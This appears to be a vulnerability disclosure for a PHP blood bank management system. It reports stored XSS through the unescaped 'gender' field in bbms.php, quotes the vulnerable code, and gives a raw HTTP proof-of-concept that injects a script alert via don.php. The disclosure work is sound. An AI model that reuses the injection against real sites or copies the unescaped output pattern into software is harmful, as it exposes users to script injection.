# blood-bank-system-in-php $gender parameter xss.

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

# AFFECTED  VERSION(S)

## Vulnerable File

bbms.php via the $gender parameter.

## VERSION(S)

-  v1.0

## Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

# PROBLEM TYPE

## Vulnerability Type

XSS vulnerability

## **Description of the vulnerability**

## $gender parameter

Retrieve the value of $gender parameter and echo the content to the foreground. If blood name is xss code, it will cause code execution.

```
     $gender = $rows['gender'];
    echo "<td>$gender</td>";
```

![image-20241003235511090](https://github.com/user-attachments/assets/d3dafc4a-3e03-40e2-b03f-61a4c9638045)

## **Vulnerability recurrence**

### **POC**

Just need to execute the POC and insert the xss code into the database

```
POST /don.php HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/don.php
Cookie: PHPSESSID=0ci9v3uj72cq2svdhvu3cl6nuh
Upgrade-Insecure-Requests: 1
Priority: u=0, i

fullname=4&phno=1&gender=%3Cscript%3Ealert%28%22genderxss%22%29%3B%3C%2Fscript%3E
```

### Result

We can trigger the XSS vulnerability that was just inserted by accessing  bbms.php to echo gender parameter values. 

```
GET /bbms.php HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=0ci9v3uj72cq2svdhvu3cl6nuh
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

![image-20241003235749505](https://github.com/user-attachments/assets/4c408e20-25e4-48ac-937c-d450daa54f4a)